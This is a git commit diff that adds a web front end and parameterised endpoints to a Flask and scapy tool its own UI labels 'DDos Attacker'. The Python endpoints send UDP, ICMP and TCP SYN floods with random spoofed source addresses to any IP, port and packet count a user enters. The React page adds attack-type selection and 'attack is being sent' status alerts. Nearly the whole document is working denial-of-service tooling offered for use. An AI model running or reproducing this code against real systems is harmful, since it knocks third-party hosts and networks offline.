bf1829def1b1f87902b6e275e22ff92885ad76c7
unknown <aashrav.shetty01@gmail.com>
2021-12-01 01:16:56 -0800

    Added frontend ui

--- api/api.py
+++ api/api.py
@@ -2,6 +2,8 @@ import time
 from flask import Flask
 import sys
 from scapy.all import *
+from flask import request
+
 app = Flask(__name__)
 
 def randomIP():
@@ -12,14 +14,12 @@ def randPort():
     x = random.randint(0, 64000)
     return x
 
-@app.route('/udp_flood')
+@app.route('/udp')
 def udp_flood():
-    #Get Destination ip address input
-    dest_ip_address = '192.168.23.1'
-    #Get Destination port input
-    dest_port = 7000
-    #Get number of packets that need be sent
-    pkt_count = 10000
+    dest_ip_address = request.args.get('ip')
+    dest_port = int(request.args.get('port'))
+    pkt_count = int(request.args.get('pktCount'))
+
     for i in range(0, pkt_count):
         #Generate radnomIP address to indicate the source
         src_ip = randomIP()
@@ -28,10 +28,46 @@ def udp_flood():
         #Create UDP object to given destination port
         udp = UDP(dport=dest_port)
         #Create packet from IP packet and UDP Object
-        pkt = packet/udp/Raw(load="BRUHHHHHHHHHHHHH")
+        pkt = packet/udp
         #Send request
         send(pkt)
     return "Success"
 
 
-    
+@app.route('/icmp')
+def icmp_flood():
+    dest_ip_address = request.args.get('ip')
+    dest_port = int(request.args.get('port'))
+    pkt_count = int(request.args.get('pktCount'))
+
+    for i in range(0, pkt_count):
+	    #Generate radnomIP address to indicate the source
+        src_ip = randomIP()
+        #create an IP packet from source IP to destination IP
+        packet = IP(src=str(src_ip), dst=dest_ip_address)
+        #Create packet from IP packet and ICMP Object
+        pkt = packet/ICMP()
+        #Send request
+        send(pkt)
+    return "Success"
+
+@app.route('/tcp')
+def tcp_flood():
+    dest_ip_address = request.args.get('ip')
+    dest_port = int(request.args.get('port'))
+    pkt_count = int(request.args.get('pktCount'))
+
+    for i in range(0, pkt_count):
+        #Generate radnomIP address to indicate the source
+        src_ip = randomIP()
+        #create an IP packet from source IP to destination IP
+        packet = IP(src=str(src_ip), dst=dest_ip_address)
+        #Create TCP object with random source port and given destination port
+        tcp = TCP(sport=RandShort(), dport=dest_port, flags="S")
+        #Create packet from IP packet and TCP Object
+        pkt = packet/tcp
+        #Send request
+        send(pkt)
+    return "Success"
+
+
--- src/App.js
+++ src/App.js
@@ -1,18 +1,93 @@
 import './App.css';
 import axios from 'axios';
-import {Button} from '@mui/material'
+import { Grid, Button, TextField, MenuItem, Select, InputLabel, FormControl, Typography, Alert } from '@mui/material';
+import { useState } from 'react';
 
-async function CallAPI(){
-  var response = await axios.get('/udp_flood')
-  console.log(response)
-}
 
-function App() {
+
+const App = ()  => {
+  const [type, setType] = useState('');
+  const [ip, setIp] = useState('');
+  const [port, setPort] = useState('');
+  const [packets, setPackets] = useState(null);
+  const [success, setSuccess] = useState(false);
+  const [sending, setSending] = useState(false);
+  const CallAPI = async() => {
+    setSuccess(false)
+    setSending(true)
+    var response = await axios.get(`/${type}?ip=${ip}&pktCount=${packets}&port=${port}`)
+    if(response.data === "Success"){
+      setSuccess(true);
+    }
+    setSending(false)
+  }
+
   return (
     <div className="App">
-      <header className="App-header">
-        <Button styles = {{color: 'white'}} onClick = {() => CallAPI()}>Click</Button>
-      </header>
+        <Grid container style = {{width: '50%', padding: '40px'}} spacing = {2}>
+          <Grid item xs = {12}>
+            <Typography fullWidth variant = 'h3' style = {{fontWeight: 'lighter'}}>DDos Attacker</Typography>
+          </Grid>
+          {(sending) ? 
+            <Grid item xs = {12}>
+              <Alert style = {{width: '100%', padding: 0}} severity="info">DDoS attack is being sent...</Alert>
+            </Grid>
+            : null}
+          {(success) ? 
+            <Grid item xs = {12}>
+              <Alert style = {{width: '100%', padding: 0}} severity="success">DDos attack was successfull</Alert>
+            </Grid>
+            : null}
+          <Grid item xs = {6}>
+            <FormControl fullWidth>
+
+              <InputLabel id="demo-simple-select-standard-label">Attack Type</InputLabel>
+
+              <Select
+                style = {{width: '100%'}}
+                label = "Attack Type"
+                onChange = {(e) => setType(e.target.value)}
+              >
+                <MenuItem value = 'udp'>UDP</MenuItem>
+                <MenuItem value = 'icmp'>ICMP</MenuItem> 
+                <MenuItem value = 'tcp'>TCP</MenuItem> 
+
+              </Select>
+            </FormControl>
+
+          </Grid>
+          <Grid item xs = {6}>
+            <TextField 
+              style = {{width: '100%'}} 
+              placeholder = "Ip Address"
+              onChange = {(e) => setIp(e.target.value)}
+            />
+          </Grid>
+          <Grid item xs = {4}>
+            <TextField  
+              style = {{width: '100%'}}  
+              placeholder = "Port"
+              onChange = {(e) => setPort(e.target.value)}
+            />
+          </Grid>
+          <Grid item xs = {4}>
+            <TextField 
+              style = {{width: '100%'}} 
+              placeholder = "Packets"
+              onChange = {(e) => setPackets(e.target.value)}
+            />
+          </Grid>
+          <Grid item xs = {4}>
+            <Button 
+              fullWidth 
+              style = {{height: '100%', backgroundColor: '#1976d2', color: 'white'}}
+              onClick = {() => CallAPI()}
+            >
+              Send
+            </Button>
+          </Grid>
+        </Grid>
+        {/* <Button styles = {{color: 'white'}} onClick = {() => CallAPI()}>Click</Button> */}
     </div>
   );
 }
